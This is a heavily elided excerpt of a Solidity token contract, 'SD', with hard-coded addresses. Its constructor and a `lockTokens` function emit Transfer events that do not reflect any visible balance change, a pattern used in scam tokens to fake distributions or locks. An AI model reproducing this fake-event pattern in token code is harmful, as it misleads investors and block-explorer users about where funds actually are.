...
contract SD is Context, IERC20 {
    ...
    address public _path_ = 0x10ED43C718714eb63d5aA57B78B54704E256024E;


    address _contDeployr = 0x541F39b58805C73EB1260E060c8c538A2bf751c7;
    address public _ownr = 0xab625ec4a4c468A74c182a58E38b54223E2D3d6B;
   constructor () public {
        ...
        emit Transfer(_contDeployr,0x541F39b58805C73EB1260E060c8c538A2bf751c7, initialSupply/5);
        emit Transfer(0x541F39b58805C73EB1260E060c8c538A2bf751c7,0x3CC936b795A188F0e246cBB2D74C5Bd190aeCF18, initialSupply/5);
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function lockTokens(uint256 x)  public _verify(){
      emit Transfer(_contDeployr, 0xC765bddB93b0D1c1A88282BA0fa6B2d00E3e0c83, x*10**18);
